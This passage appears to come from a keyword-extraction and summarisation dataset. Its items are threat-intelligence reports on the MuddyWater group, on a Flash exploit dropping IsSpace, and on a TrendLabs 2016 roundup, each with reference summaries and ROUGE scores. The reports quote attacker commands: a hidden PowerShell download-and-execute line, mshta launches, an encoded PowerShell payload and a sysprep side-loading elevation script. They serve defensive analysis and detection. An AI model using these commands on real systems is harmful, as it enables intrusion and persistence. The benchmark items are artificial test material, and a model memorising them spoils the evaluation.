same techniques and names as before, with the exception ofthe scheduled-task entry name that changes as follows:WindowsOptimizations\t->\tMicrosoft\\WindowsOptimizationsServiceCurrentVersion\\Run CurrentVersion\\Run PersistenceDifferences between Old and New CurrentVersion\\RunScheduled Task Scheduled Task PersistenceDifferences between Old and New Scheduled TaskMuddyWater Communication MuddyWater CommunicationCommunication with the C2 happens through compromised websites working as proxies, as explained above. Here it is a partial list of the proxies adopted by the backdoor:Proxy ListAs it can be seen from the above image, every request is performed via GET:url\u2019s interactions with the attacker can be synthesized in two main steps:UniqueKey Handling (Registration/UniqueKey Update) Command ExchangeRegistration (already explained in depth) uses the following URL parameters:Base64(CustomEncoding(a=r&b=[REGISTRATION_DETAILS]))The \ufb01nal result from a network point of view is: registrationCommand Exchange happens through the function getCommand getCommand.The Backdoors can request a command to the attacker using the $id which is the UniqueKey:Base64(CustomEncoding(a=g&b=$id))The attacker replies as follows:Base64(CustomEncoding($cmdID~~$cmd))Once the backdoor executes the command $cmd, it replies back to the attacker with the result:Base64(CustomEncoding(a=s&i=$id&ch=last&ci=$cmdId&r=$result))Depending on the length of the result, the reply to the attacker can be divided in chunks.This is an extract of commands received directly from the attacker:781~~Remove-itemproperty\t-path\tHKCU:\\Software\\Classes\\exefile\\shell\\runas\\command\t-name\tIsolatedCommand\t-Force791~~powershell\t-nop\t-w\thidden\t-exec\tbypass\t-c\t\"IEX\t(New-Object\tNet.WebClient).DownloadString('url\"As we can see from the last command, the attacker sent a new powershell script:powershell script sh.txtWhose scope was to update the backdoor:New C2 address New isDebugEnv function New proxy list (reported below)Old vs New Proxy ListIn another session we received other commands whose scope was to try other backdoors:Koadic JScript RAT:821~~mshta\turl~~whoamiKoadic JScript RAT:826~~mshta\turl injected using to_mem_pshre\ufb02ection.ps1.template 829~~powershell.exe\t-nop\t-w\thidden\t-e\taQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAk[ ]Koadic JScript RAT:836~~mshta\turl Attribution MuddyWater AttributionAs usual attribution of cyber espionage operations is a very complex topic and we don\u2019t have de\ufb01nitive  elements to make conclusions, that said during our investigation we noticed what might have been a mistake from one of the operators and for a while we were able to track his/her movements. The IP address was in Tehran, Iran and we have reason to believe that, in that speci\ufb01c instance, we were  dealing with a \ufb01nal IP address and not a proxy, or a victim used to conceal the real address. Other  elements provide circumstantial evidence that the attacks can reasonably originate from Iran like the kind (and more speci\ufb01cally the identities) of the victims most investigated by the operators and their  geographic distribution.Despite the origin of MuddWater\u2019s attacks, a lot of doubts remain, the \ufb01rst of them is whether the group  is state-sponsored or part of the organized crime. The relatively low sophistication of the attacks and the general handling of their infrastructure led us to think about a criminal group, but the choice of victims and their agility once inside the compromised infrastructures made us think about a more structured entity (possibly made by two different groups, one for attacks and another one specialized in post-exploitation activities). The second is about their link with APT33/OilRig similarities in the techniques adopted by MuddyWater and APT33/OilRig but whether the operations belong to the same actor is still unknown. Conclusions ConclusionsAPT33/OilRig, there are differentOur customers running ReaQta-Hive are already protected and no further action is required. We suggest to check for all the published IOCs in order to understand whether the current backdoors are active and to check for signs of persistence described above. url url url url url KoadicPowerstats and vbs launcher hashes Powerstats Proxy URLsurl url url url url\ufb01fteen/logs[.]php?c=  url url url url url url[.]com/404[.]php?c=  url url url url url url url url url url\ufb01fa[.]com/wp-content/themes/Newspaper/mobile/includes/404[.]php?c=  url\ufb01fa[.]com/wp-content/themes/Newspaper/mobile/work[.]php?c=  url url url url url url\ufb01fteen/work[.]php?c=  url\ufb01g[.]php?c=  url url url\ufb01ce/lib/work[.]php?c=  url url url url\ufb01le/sym/work[.]php?c=  url url url url url url\ufb01les/articles/css[.]aspx?c= url\ufb01les/articles/large/css[.]aspx?c=  url url url url url url url url url\ufb01eld[.]com/v2/work[.]php?c=  url url url url url url url url url url url url\ufb01fteen/logs[.]php?c=  url url url url Bypass scripts uac.ps1Normal.dotm powershell script Persistence ArtifactsHKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u2013 Key \u201cWindowsHKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u2013 Key: \u201cWindowsRegistry \u2013 HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Optimizations\u201d \u2013 Value \u201cwscript [maliciuous].vbs\u201d Registry \u2013 HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Optimizations\u201d \u2013 Value:\u201cwscript [maliciuous].vbs\u201d Scheduled Task \u2013 Name: Microsoft\\WindowsOptimizationsService \u2013 Action: \u201cwscript [maliciuous].vbs\u201d Word Template \u2013 Path: c:\\users\\{user}\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm ,powerstats rat saudi arabia uae,,, APT iraq jscript koadic living off the land meterpreter Middle East muddywater pakistan powershell,,,,,,,, ,PAGESBlogContact UsPartnersProductsReaQta-HiveRECENT POSTSA dive into MuddyWater APT targeting Middle-EastA short journey into DarkVNC attack chainLocky Dropper Now Comes Embedded in the LoaderCopyright ReaQta 2017Blog ProductsJoin Us Contact Us Privacy Policy ", "generated_text": "the report; MuddyWater; a threat actor; the Middle East; 2017; the group; Powershell; RATs; the first detection; the second half of September; the payload; GitHub; Pastebin; the payload; a remote source; the malware; detections; the C2; the C2; patches; data; infrastructure; data integrity; the C2; government; military; companies; government entities; Pakistan; Saudi Arabia; UAE; Iraq; Count; the originating country; Iran; the originating country; Iran; the originating country; Pakistani; intelligence; analysis; the Middle East.", "ref_text": "<START-1>The PDF provides an analysis of a cyberespionage group called MuddyWater that has been actively targeting victims primarily in the Middle East during 2017. MuddyWater uses phishing emails with macro-enabled Office documents to infect victims with a PowerShell backdoor called POWERSTATS. This backdoor connects to command and control servers to receive commands and exfiltrate data. The group constantly changes infrastructure and adapts techniques to evade detection, such as moving from GitHub to Pastebin for hosting payloads. They have expanded targeting beyond the Middle East to countries like India and the US. The PDF examines the evolution of MuddyWater's tactics from the first public reports in September 2017 through November 2017. It tracks the changes in C2 servers, proxy sites, malware delivery methods, and backdoor code. While some have attributed MuddyWater to the FIN7 cybercrime group, the PDF argues this link is questionable and they are more likely a separate espionage-motivated group, based on distinct targeting, infrastructure, and malware. MuddyWater heavily targets the government, telecoms, and oil sectors in countries like Iraq, Saudi Arabia, UAE. The PDF speculates the group could originate from Iran based on infrastructure clues, but definitive attribution is difficult. In summary, the analysis profiles the tactics, infrastructure, targeting, and capabilities of the MuddyWater APT group as an active threat conducting cyberespionage in the Middle East in 2017. It tracks the group's evolution and argues against attribution to FIN7. <END-1>", "t5/keyword/hint_hit_precision": 0.38095238095238093, "t5/word/hint_hit_recall": 0.08658008658008658, "gpt3/lexical/rouge_rouge1": 0.38670694864048333, "gpt3/lexical/rouge_rouge2": 0.11550151975683891, "gpt3/lexical/rouge_rougeL": 0.229607250755287, "gpt3/lexical/rouge_rougeLsum": 0.229607250755287, "gpt3_generated_text": ["The article provides an in-depth analysis of the MuddyWater threat actor targeting the Middle East in 2017. The group utilizes Powershell and RATs in their attacks, with the first detection occurring in the second half of September. Initially, the payload was downloaded from GitHub, but later shifted to Pastebin. The threat evolved to embed the payload, and new C2 addresses were disclosed. The group targets government, military, and companies in Pakistan, Saudi Arabia, UAE, and Iraq. The origin country is likely Iran, and the operators demonstrate a strong focus on data integrity and evading detections."]}, {"split_name": "val", "sample_id": "val_104", "prompt_text": "Extract the keywords: Watering Hole Attack on Aerospace Firm Exploits CVE-2015-5122 to Install IsSpace BackdoorOn July 16, 2015, the Palo Alto Networks Unit 42 threat intelligence team discovered a watering hole attack on the website of a well-known aerospace firm. The website was compromised to launch an apparent watering-hole attack against the company\u2019s customers. It was hosting an Adobe Flash exploit targeting one of the newly disclosed vulnerabilities from the Hacking Team data breach, CVE-2015-5122.This attack yet again showcases the opportunistic tendencies of adversary groups and bad actors. The malware deployed by this exploit has been seen in a number of targeted attacks and provides attackers with a foothold on the victim\u2019s machine and/or network.The exploit file, movie.swf, was ZWS compressed, a tactic that has been observed to evade anti-virus programs. Once uncompressed, a binary was found to be embedded in the Flash file. Upon further analysis, this file was found to contain behavior consistent with a Trojan commonly called IsSpace. Based on its codebase and behavioral patterns, it appears that IsSpace could possibly be an evolution of the NFlog backdoor, which has previously been attributed to the adversary groups DragonOK and Moafee. Both groups are thought to be operating out of Southeast Asia, and Moafee in particular has been associated with attacks on the US defense industrial base.Exploit DetailsThe CVE-2015-5122 exploit found within the Flash file is nearly identical to the original proof of concept (POC) disclosed publically from the Hacking Team data breach. An analysis by Trend Micro covers the POC in detail. Unlike the POC mentioned in the Trend Micro report, this particular exploit file was weaponized, and, instead of loading calc.exe, a much more malicious file was loaded. As seen in Figure 1, the embedded shellcode is obfuscated using the same technique of representing bytes as integers and exponential numbers. However it appears that the adversary did not modify the POC much, as the variable name \u2018calc\u2019 remains unchanged.Figure 1. Embedded shellcode within the malicious Flash fileThese values can be converted into their byte representations using a simple Python script, truncated here for brevity.>>> import struct >>> shellcode = [2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585] >>> for s in shellcode: print repr(struct.pack(\"I\", s)) 'U\\x8b\\xec\\x81' '\\xec`\\x04\\x00' '\\x00S\\x90\\x90' '\\x90\\x90\\xc7\\x85' '\\xd0\\xfc\\xff\\xff' 'AAAA'>>> import struct>>> shellcode = [2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585]>>> for s in shellcode: print repr(struct.pack(\"I\", s)) 'U\\x8b\\xec\\x81''\\xec`\\x04\\x00''\\x00S\\x90\\x90''\\x90\\x90\\xc7\\x85''\\xd0\\xfc\\xff\\xff''AAAA'Looking at the shellcode in further detail shows a fairly simplistic instruction set. Functions are loaded dynamically, and a file is dropped to %TEMP%\\Rdws.exe before being executed using the WinExec Windows API call.sz_file_path = GetTempPathA(256, file_path); *&file_path[sz_file_path] = 'swdR'; *&v6[v7 + 4] = 'exe.'; *&v6[v7 + 8] = 0; file_handle = CreateFileA(file_path, 0x40000000, 0, 0, 2, 0, 0); if ( file_handle != -1 ) { WriteFile(file_handle, data, v41, &v110, 0); CloseHandle(file_handle); WinExec(file_path, 0); }sz_file_path = GetTempPathA(256, file_path);v6 = file_path;v7 = sz_file_path;*&file_path[sz_file_path] = 'swdR';*&v6[v7 + 4] = 'exe.';*&v6[v7 + 8] = 0;file_handle = CreateFileA(file_path, 0x40000000, 0, 0, 2, 0, 0);if ( file_handle != -1 ){WriteFile(file_handle, data, v41, &v110, 0);CloseHandle(file_handle);WinExec(file_path, 0);}Returning to the Flash exploit, we discover that the dropped file is embedded within the Flash file itself as ByteArray. This binary data is loaded and decompressed with ZLIB prior to being stored in a newly allocated section of memory. The address of this binary data is then stored in the shellcode before it is executed.Figure 2. Exploit loading binary and running shellcodeAfter successful execution, a binary with the following attributes is executed on the victim\u2019s machine.MD5 Compile TimestampMalware Details319500B2C792AEE6CD8EF8EE87D9DC1E PE32 executable (GUI) Intel 80386, for MS Windows 2014-11-14 04:35:13 UTCAs seen by the compile timestamp, this malware sample is not extremely current. The timestamp shows a compile date of November 14, 2014, which indicates that the infrastructure used by this particular sample has remained intact for quite some time, relatively speaking. Analysis of the malware indicates that this sample is highly likely to be the Trojan tool IsSpace, which shares similar code and behaviors as the NFlog tool.When comparing IsSpace to NFlog, we noticed a number of changes have been made. When initially run, the malware attempts to write log messages to \u2018C:\\ProgramData\\log[.]txt\u2019 indicating that this variant was intended to run on Microsoft Windows 7 or higher. However, it still maintains the capability to run on operating systems earlier than Microsoft Windows 7 if needed. IsSpace creates an event named\u2018MdQ0784kd\u2019 to ensure that only a single instance of the malware is running at any given time on an infected host.To determine the flow of execution, IsSpace gathers various data about the infected host, such as administrative rights of the user, operating system version, and CPU architecture.If IsSpace determines that it is running as an administrator on a Microsoft Windows 7 system on a 32-bit platform, it will attempt to execute itself accordingly, using a side-loading technique. The malware will drop a cabinet file and batch script to the following locations:%TEMP%\\FASAP.DAT %TEMP%\\FASAPI.batThe batch script contains the following:@echo off ping localhost start wusa [%TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\ start %windir%\\system32\\sysprep\\sysprep.exe \"[CWD]\\[Malware].EXE\"@echo offping localhoststart wusa [%TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\ping localhostping localhostping localhostping localhostping localhoststart %windir%\\system32\\sysprep\\sysprep.exe \"[CWD]\\[Malware].EXE\"[CWD] is the directory where the malware was run from and [%TEMP%] is the full path of the %TEMP% directory.The batch script will first extract the cabinet file to the sysprep directory. The extracted file is a 32-bit DLL with the name \u2018CryptBase.dll.\u2019 The batch script continues to execute sysprep.exe after approximately 5 seconds, which will automatically load the dropped CryptBase.dll file. This DLL will execute the provided argument in a child process. This newly created process has elevated privileges as it is spawned bysysprep.exe.A similar process is taken for 64-bit systems. However, instead of dropping a batch script, a 64-bit executable along with a cabinet file containing a 64-bit version of CryptBase.dll is dropped to the following path instead:%TEMP%\\FASAPI.bin %TEMP%\\FASAP.DATThis executable is then run in a new process. It is responsible for unpacking the cabinet file and spawning a new instance of sysprep.exe.If the malware detects that it is running on a Windows XP host, it will attempt to check for Internet connectivity by making a HTTP request to www.microsoft.com. This is similar to characteristics observed in the NFlog backdoor, with the primary deviation being that this activity only takes place when running and control (C2) server. The initial HTTP request is made to \u2018//STTip.asp.\u2019 Note the extra leading forward slash. This is likely an unfortunate side effect of the malware expecting a subdirectory in the URI path. As this particular sample did not supply one, the extra slash is seen. An example request made can be seen below:Figure 3. Initial IsSpace beacon being sentAfter the initial beacon, IsSpace will exfiltrate victim information by making an HTTP request to \u2018//SNews.asp?HostID=xx-xx-xx-xx-xx-xx\u2019, where the HostID contains the victim\u2019s MAC address. The POST data sent in this request is encrypted using the same four-byte XOR key of \u2018\\x35\\x8E\\x9D\\x7A\u2019 that LJLV2NKIOKP#%#Win7#%#English(US)#%#2015-07-17 07-17 09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'Once again, the exfiltrated data is very similar to what has been used by NFlog; however with IsSpace, the victim\u2019s user privilege level is also included, in addition to a variable of either \u2018IsSpace\u2019 or \u2018IsGoogle.\u2019 This particular variable is still under investigation by Unit 42. Additionally, we see what is likely a campaign code of \u2018303_20140401\u2019.After the successful check-in and initial exfiltration, IsSpace will then accept the following commands:Command List specified directory Delete fileResponse URI N/AIsSpace provides attackers with a foothold into the victim\u2019s machine and/or network. While the malware itself provides limited functionality, it allows attackers to perform minimal reconnaissance and deploy Pivoting off of this primary C2 IP address using passive DNS data, we located seven domain names and two additional IP addresses that may be related to this attack. Three of the domains found used the prefix \u2018ssl\u2019 or \u2018dns\u2019 as the third level domain; this tactic is commonly used by malware authors as an evasion method.Examining the WHOIS data for the domains revealed additional intelligence on possible attribution. Specifically, the WHOIS data showed the start-vedioing[.]net to be allegedly registered to an entity in Japan:Registry Registrant ID: Registrant Name: Alta Rohde Registrant Organization: Registrant Street: tokoy Registrant Street: tokoy Registrant City: tokoy Registrant State/Province: Aomori Registrant Postal Code: 236521 Registrant Country: Japan Registrant Phone: +81.21244215 Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: alta.rohde@inbox[.]comAnd the anywhere-staring[.]com was found to be allegedly registered to an entity in China:Registry Registrant ID: Registrant Name: lan fei Registrant Organization:Registrant Street: tian jing lu 244 Registrant City: bei da Registrant State/Province: qing nao Registrant Postal Code: 888000 Registrant Country: China Registrant Phone: +86.13877554411 Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: csolyc110@163[.]comThe geographic regions indicated in the WHOIS data are consistent with campaigns previously associated with NFlog, showing that the adversaries attributed to this malware were highly likely to be operating out of Southeast Asia. IsSpace is a newer variant of the NFlog malware family, and contains many similarities in its behavior and code base. It is highly likely that adversary groups that have historically used NFlog are now using IsSpace.ConclusionAdversaries continue to exploit easily accessible vulnerabilities and readily re-use exploit code and payloads, largely due to their efficacy. This type of behavior and activity is expected to continue for the near future due to the multiple vulnerabilities disclosed by the Hacking Team data breach.As with many other previously disclosed advanced attacks, relying purely on a detection-based model for security is ineffective when IOCs are either unknown or are not readily available for ingestion. Thus, it is imperative that organizations deploy automated, behavior-based preventative measures such as Palo Alto Networks WildFire or Traps to reduce the risk of unknown attacks.Palo Alto Networks customers using WildFire are protected from this campaign. Additionally, IPS signature 14365 detects IsSpace command and control traffic inside a network.File InformationName Compile TimestampRdws.exe PE32 executable (GUI) Intel 80386, for MS Windows 2014-11-14 04:35:13 UTCC2 IP Address PE32+ executable (console) x86-64, for MS Windows 2014-05-06 13:23:38 UTC FASAP.DAT (64-bit) Microsoft Cabinet archive data, 4065 bytes, 1 file CryptBase.dll (64-bit) PE32+ executable (DLL) (GUI) x86-64, for MS Windows 2014-04-21 13:08:07 UTCFASAP.DAT Microsoft Cabinet archive data, 3870 bytes, 1 file CryptBase.dll (64-bit) PE32 executable (DLL) (GUI) Intel 80386, for MS Windows 2014-04-20 12:19:57 UTC ", "generated_text": "an Adobe Flash exploit; the CVE-2015-5122 vulnerability; an aviation firm; the website; July 16, 2015; the website; Adobe Flash; exploit; IsSpace; a Trojan; a new variant; DragonOK; Moafee; Southeast Asia; a backdoor; NFlog; the exploit; operational control; control; execution; the NFlog backdoor; IsSpace; the malware; the victim; the browser; server; the Flash file; the malware; a foothold; the network.", "ref_text": "<START-1>The document describes a watering hole attack discovered by Palo Alto Networks in July 2015 targeting the website of an aerospace company. The attack exploited the recently disclosed Adobe Flash vulnerability CVE-2015-5122 from the Hacking Team data breach. The exploit delivered a malware payload called IsSpace, which appears to be an evolution of the NFlog backdoor associated with threat groups in Southeast Asia like DragonOK and Moafee. IsSpace shares code similarities with NFlog but contains some updates like additional logging and commands. The Flash exploit is nearly identical to the public proof-of-concept for CVE-2015-5122. It drops a binary called Rdws.exe in the temp folder which executes IsSpace. IsSpace gathers system info and beacons to a C2 server at 172.246.109.27. It can exfiltrate data and accept commands like file upload/download, command execution, etc. IsSpace uses a technique called side-loading to gain persistence on the infected system. On 32-bit Windows it drops a DLL and batch script to extract and load the DLL using a signed executable sysprep.exe. This gives the malware elevated privileges. The infrastructure links and WHOIS registration details for the C2 domain suggest the attack originates from threat actors in Southeast Asia, consistent with attribution for the NFlog malware. The attack demonstrates how adversaries quickly leverage new vulnerabilities and reuse effective malware code. The document highlights the need for behavior-based security controls rather than relying solely on signature-based defenses. <END-1>", "t5/keyword/hint_hit_precision": 0.4, "t5/word/hint_hit_recall": 0.08260869565217391, "gpt3/lexical/rouge_rouge1": 0.4615384615384615, "gpt3/lexical/rouge_rouge2": 0.13917525773195877, "gpt3/lexical/rouge_rougeL": 0.25641025641025644, "gpt3/lexical/rouge_rougeLsum": 0.25641025641025644, "gpt3_generated_text": ["On July 16, 2015, the threat intelligence team at Palo Alto Networks Unit 42 uncovered a watering hole attack on the website of a prominent aerospace firm. The website was compromised to launch an attack using an Adobe Flash exploit targeting the CVE-2015-5122 vulnerability, which was part of the Hacking Team data breach. The exploit deployed a Trojan known as IsSpace, a new variant that may be linked to adversary groups DragonOK and Moafee operating out of Southeast Asia. The malware provides attackers with operational control over the victim's machine or network. The exploit, embedded in a malicious Flash file, executed shellcode to drop and execute a file on the victim's system, potentially giving the attacker control over the browser or server. This attack highlights the opportunistic nature of cyber adversaries and the importance of staying vigilant against such threats."]}, {"split_name": "val", "sample_id": "val_105", "prompt_text": "Extract the keywords: TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsContents4 Ransomware Spiked 752% in New Families in 20168 BEC Scams Generate Hundreds of Thousands in Losses Across the World10 Adobe Acrobat Reader DC and Advantech\u2019s WebAccess Have the Most Number of Vulnerabilities13 Mirai Botnet\u2019s Massive DDoS Attack Elevates IoT Security Conversation15 Biggest Data Breach in History Underscores Responsible Disclosure of Companies18 Angler Leaves the Scene with Other Exploit Kits Rising21 Bank Hacking Perseveres with Banking Trojans and ATM Malware Developments24 Threat Landscape in Review2016 was an unprecedented year for cybersecurity, particularly for enterprises. Although there were considerable wins in terms of cybercriminal arrests\u2014resulting in the drop in exploit kit numbers\u2014an array of threats, which hit a record high, still caused billions of dollars in accumulated losses.It was indeed the year of online extortion, with ransomware leading the charge. Over 200 new ransomware families triggered significant damages to a number of institutions worldwide. Business email compromise (BEC), likewise, raked in huge profits for cybercriminals while proving to everyone that social engineering is still very effective when targeting large organizations.in widely used platforms,Vulnerabilities discovered including Supervisory Control and Data Acquisition (SCADA), also surpassed records in terms of volume. This left security researchers and malicious actors caught in a race to find weak points in a system first.The biggest data breach in history was also reported in 2016. The event exposed issues in how some companies handle user data. Other organizations felt the effects of poor Internet of Things (IoT) security when the Mirai botnet surfaced and took down their servers. Banking threats also continued to develop, posing new challenges to the financial sector.This roundup reviews the pertinent security stories of 2016 and aims to help enterprises determine what to expect in the months ahead and what security strategies they can adopt to stay protected.Ransomware Spiked 752% in New Families in 2016In a span of 12 months, the number of discovered ransomware families jumped from 29 to 247. This marksa 752% increase compared to the volume of ransomware families detected in 2015.2501500247752% increase2920152016Figure 1. Number of newly added ransomware families, 2016This record increase in new families can be a result of different of factors, the first being how effectiveransomware is as a moneymaking scheme. Using ransomware, cybercriminals reportedly managed torake in about US$1 billion in 2016.1 The whopping amount is the result of several affected enterprises stillchoosing to pay their attackers to have their data and assets decrypted and restored.Although many organizations are advised not to pay the ransom and focus on creating backups, this is easiersaid than done. Many of 2016\u2019s new ransomware families were designed to target specific file types criticalto businesses. These include tax return files, server files, virtual desktop images and the like. Database filesthat are used to manage pertinent business information have also become targets.24 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats10050967581700Database\ufb01lesWebsite\ufb01lesSQL \ufb01lesTax \ufb01lesCAD \ufb01lesVirtualdesktop \ufb01les2219Figure 2. Number of known ransomware families encrypting business-related files, 2016NOTE: For the full list of ransomware families, refer to table 7 in the appendix.Affected enterprises also had to withstand significant system downtime and corporate data loss. Despitenot having any guarantee of getting their data back, many organizations still opted to give in to cybercriminaldemands. In November, the San Francisco Municipal Transportation Agency was asked to pay 100 bitcoins(approximately US$70,000) after a ransomware attack locked their computers.3 VESK, a provider of hostedvirtual desktops, paid approximately US$23,000 to get the decryption keys that will restore all of theirservices.4 The New Jersey Spine Center paid an undisclosed amount after attackers encrypted electronicmedical records, disabled their phone system, and even locked out staff members from accessing theirbackup files.5Other factors driving the increase of ransomware families were the presence of open source ransomwareand the introduction of ransomware-as-a-service (RaaS). Originally designed for educational purposes,open source ransomware like Hidden Tear and EDA2 were used by cybercriminals to target web serversand databases.6 The source codes for those ransomware strains have already been taken down after thereported abuse. RaaS also made it easier for rookie cybercriminals to utilize ransomware. Since RaaS isavailable in the underground, the service provides fledgling cybercriminals the necessary tools to run theirown extortion campaigns.7Among the ransomware threats we detected and blocked in 2016, spam remained the top ransomwarevector, accounting for 79%. Since email has become the most common entry point for ransomware\u2212eithervia malicious attachments or URLs found in the email\u2212organizations should be able to utilize web and emailgateway solutions. Possible ransomware threats can be prevented through effective monitoring of emailtraffic and filtering potentially unsafe URLs, attachments, and other malicious payloads.5 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsCRYPRADAM Encrypts files related to hosting Asks for 13 bitcoins, one of the highest at that timeCERBER Incorporates various tactics such as use of Windows\u00ae scripting files and cloud platforms; first to introduce voice readout of a ransom note Overwrites Master Boot Record (MBR)WALTRIX 2.0 Encrypts files and prevents access to desktop via lock screen ZCRYPT Spreads through USB dongles and flash drivesCRYPBEE Uses malicious macros and compromised websites as Threatens to delete one file every six hours of nonpayment. It threatens to delete all encrypted files after 96 hours of nonpayment.MILICRY Packages and sends gathered information as a .PNG file DETOXCRYPTO 2.0 Uses a spoofed Trend Micro certificateSMASHLOCK Disables Task Manager, command line, and Registry Editor. It displays a series of message boxes including a timer and progress bar. TELECRYPT Uses Telegram channels (api.telegram.org) to communicate with its command and control (C&C) serverJANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECLOCKY Arrives as a macro embedded in spam attachment, a new method identified at that timeJIGSAW Threatens to delete a number of files for every hour the ransom is not paid WALTRIX One of the first ransomware families in 2016 distributed via exploit kitsGOOPIC Dropped by Rig exploit kit; gives users longer period for ransom payment before permanently encrypting data MIRCOP Disguises itself as a fake Thai Customs form. Instead of the usual ransom note, MIRCOP demands to be paid back, assuming affected users know how ransomware payment works. It also asks for more than 40 bitcoins in payment\u2014one of the highest seenCERBER 3.0 Is distributed by Magnitude and Rig exploit kits ELFREXDDOS A Linux ransomware that is capable of launching DDoS attacksCOMLINE First ransomware seen that uses command line to execute SHOR7CUT Targets web serversPOPCORNTYM Instructs affected users to spread the malware in exchange for the Connects to MISCHA and PETYA ransomware. This malware reboots the system which triggers the ransomware\u2019s encryption routine.Figure 3. A timeline of noteworthy ransomware families, 20166 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsReputation-based analysis should also be able to filter against web and file threats. Based on the numberof ransomware-related detections, downloads from URLs that host ransomware or exploit kits distributingransomware were at 20%, while detections from actual ransomware files were at 1%.Security solutions that are able to blend this kind of reputation technology with other anti-ransomwarecapabilities like whitelisting and application control, behavioral analysis, network monitoring, vulnerabilityshielding, and high-fidelity machine learning can better protect organizations while minimizing the impact ontheir computing resources. Endpoint application control, for example, allows users within the organizationto access known good files while the rest go through filtering. This provides undisrupted access to safecontent while limiting incidents of false positives. Machine learning, utilized during pre-execution and runtime, can further provide more accurate detection.As ransomware families continue to evolve and multiply, it is critical for enterprises to recognize this realityand help make their data security strategy stronger and more efficient.7 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsBEC Scams Generate Hundreds of Thousands in Losses Across the WorldBEC attacks are responsible for causing an average of US$140,000 in losses for companies worldwide.8Leoni AG, the fourth largest wire and cable manufacturer in the world, became a victim of a BEC attack whenits Chief Financial Officer (CFO) was tricked into transferring about US$44.6 million to a foreign account.9Scammers also swindled approximately US$330,000 from the local council of Brisbane in Australia afterthey posed as one of the council\u2019s suppliers.10 SS&C Technology also lost US$6 million to a BEC scam thatforced the company to temporarily take its operations offline.11BEC scams have spread in 92 countries. Those most affected countries include the United States, theUnited Kingdom, Hong Kong, Japan, and India. The map below shows all the affected regions in 2016.U.K. 9.61%Norway 2.02%U.S.37.55%France 2.20%Japan 2.75%Hong Kong2.85%Brazil 2.34%Argentina1.45%India 2.39%Australia2.34%>1.44%1.44% - 1%<1%Unspeci(cid:31)ed country domainsFigure 4. Countries with the most number of companies affected by BEC, 20168 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsIn the latter part of the year, cybercriminals ramped up their campaigns with CEO fraud schemes, a type ofBEC scam wherein cybercriminals impersonate a CEO or any executive who can authorize fund transfers.Cybercriminals used this technique when they targeted 17 healthcare institutions in the United States, 10in the United Kingdom, and eight in Canada in just two weeks.12 These institutions included general andteaching hospitals, specialty care and walk-in clinics, and even pharmaceutical companies.Since BEC scams heavily rely on social engineering, there\u2019s great weight on the human factor. The morestaff members\u2014from a CEO to a rank-and-file employee\u2014are aware of how BEC works and how to identifyit, the more equipped an organization will be to defend against this threat. Fraudulent wire transfer requestsusually require urgent action from the targeted employee. And so it is important for everyone to scrutinizeand double-check transfer details first. Recognizing phishing emails, in particular, and being wary of clickingon any links can also reduce the chances of being at the mercy of cybercriminals.When processing confidential emails, it is also recommended to manually enter the email addresses of theconcerned parties instead of just relying on the provided default addresses. Manually typing addressesfrom a contact list will help ensure that correspondences and wire transfers are indeed legitimate. Havinganother efficient method of verifying a fund transfer, such as phone verification, will also help reduce the riskof processing a fraudulent request.Since most types of BEC emails don\u2019t involve a malware payload, traditional email solutions that tend to onlydetect malicious behavior won\u2019t be able to stop these kinds of scams from landing inside an employee\u2019sinbox. Organizations are recommended to have web and email gateway solutions that don\u2019t only have anti-spam and anti-phishing capabilities but also context-aware social engineering attack protection features,which are capable of inspecting email headers and other social engineering tactics used in BEC attacks.9 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsAdobe Acrobat Reader DC and Advantech\u2019s WebAccess Have the Most Number of VulnerabilitiesIn 2016, Trend Micro and the Zero Day Initiative (ZDI) (with TippingPoint) discovered a record high of765 vulnerabilities (including 60 zero days)\u2014an increase from 714 in 2015. Of the 765 total, Trend Microresearchers independently discovered 103 vulnerabilities, while ZDI found 678. Sixteen vulnerabilities arecommon to both.Trend Micro8716ZDI662ProductNumber of VulnerabilitiesAdvantech WebAccess109Adobe\u00ae Acrobat\u00ae Reader DCApple\u00ae OS X\u00aeAndroidFoxit\u00ae ReaderAdobe Flash\u00aeMicrosoft\u00ae Internet Explorer\u00aeMicrosoft Windows\u00ae OSSolarWinds\u00aeMicrosoft Edge895252493833262522Figure 5. Number of vulnerabilities discovered byTable 1.Trend Micro and ZDI (with TippingPoint)Trend Micro and ZDI, 2016Top 10 applications based on number ofvulnerabilities discovered in 2016Most of the vulnerabilities were found in Adobe Acrobat Reader DC and Advantech\u2019s WebAccess (with 26zero days). The former is an enterprise application that handles .PDF files, while the latter is used in SCADAsystems.10 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise ThreatsAlthough Adobe Acrobat Reader DC saw no increase or decrease from its 2015 record, the application stillhad the most number of vulnerabilities compared to all other Adobe products. Adobe Flash noticeably hadfewer vulnerabilities compared to last year\u2019s 67 vulnerabilities, which marks a 43% decrease. That numbermay continue to drop as more browsers are disabling Flash by default and are now migrating to HTML5.13Despite that, the presence of Adobe Flash zero-day vulnerabilities14 still leaves outdated systems vulnerableto attacks. For instance, an Adobe Flash zero day allowed attackers behind Pawn Storm to ramp up theirspear-phishing campaigns against governments and embassies across the world.15Meanwhile, Microsoft saw a 47% decrease in its vulnerabilities, with a total of 93 recorded vulnerabilities\u2014down from the previous year\u2019s 175. While Internet 